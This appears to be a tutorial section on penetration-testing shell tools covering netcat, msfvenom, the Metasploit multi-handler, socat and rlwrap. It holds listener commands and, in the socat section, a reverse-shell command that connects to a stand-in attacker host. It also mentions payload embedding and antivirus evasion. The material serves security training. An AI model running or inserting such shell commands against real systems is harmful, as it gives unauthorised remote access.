# Shells Overview - Tools

## Netcat (nc)
Netcat is the Swiss Army knife of networking tools, capable of reading from and writing to network connections using TCP or UDP. In the context of shells, netcat is used primarily as a listener for reverse shells and as a client for connecting to bind shells. The typical listener command is `nc -lvnp <port>`, where -l specifies listen mode, -v enables verbose output, -n skips DNS resolution, and -p specifies the port. Some netcat versions (notably the original Hobbit netcat and OpenBSD netcat) support the -e flag for executing a program when a connection is made, enabling quick bind shells. The GNU netcat (netcat-traditional on Debian) may lack -e support, requiring alternative approaches like the FIFO method or using ncat (from Nmap). Netcat is invaluable for its simplicity and universal availability on Linux systems.

## Metasploit Framework (msfvenom)
msfvenom is the payload generator component of the Metasploit Framework. It replaces the older msfpayload and msfencode tools, combining their functionality into a single command-line utility. msfvenom can generate shellcode and standalone payload executables in dozens of formats (-f flag) for various platforms and architectures. It supports: all Metasploit payloads (reverse shells, bind shells, Meterpreter), automatic encoding for antivirus evasion, template files for embedding payloads in legitimate executables, and output formats from raw shellcode to ELF executables, Windows EXEs, PowerShell scripts, Python scripts, and more. msfvenom is the standard tool for generating custom payloads across the security industry.

## Metasploit Multi-Handler
The Metasploit multi-handler (exploit/multi/handler) is a Metasploit module that sets up a listener for incoming shell connections. Unlike netcat, it understands Metasploit's payload format and can automatically handle staged payloads by sending the second stage to connecting clients. The multi-handler also supports post-exploitation modules, allowing testers to immediately run privilege escalation, persistence, or data collection scripts after shell acquisition. Configuration involves setting PAYLOAD, LHOST, LPORT, and optionally EXITFUNC and AutoRunScript. The multi-handler session management allows interaction with multiple shells simultaneously and migrating sessions between payloads.

## Socat
Socat (SOcket CAT) is a more powerful alternative to netcat that establishes bidirectional data streams between two endpoints. Socat supports a wider range of address types including TCP, UDP, SSL, SOCKS, UNIX sockets, PTY, file descriptors, and more. For shell work, socat excels at creating fully interactive TTY connections that avoid the limitations of basic netcat shells. The key socat feature is its ability to allocate a PTY on the target side, providing proper terminal handling, job control, and signal processing. The command sequence for a fully interactive socat shell is: on the attacker, `socat TCP-L:4444 FILE:`tty`,raw,echo=0` and on the target, `socat TCP:attacker:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane`.

## rlwrap
rlwrap is a utility that wraps any command-line tool with the GNU Readline library, providing line editing, persistent history, and tab completion. When used with netcat listeners (`rlwrap nc -lvnp 4444`), it significantly improves the shell experience by enabling arrow key navigation, command history recall, and basic editing capabilities. While rlwrap does not provide full TTY functionality (it cannot handle interactive programs that require terminal control), it is a simple improvement for basic shells. rlwrap is available in most Linux package repositories and requires no configuration.
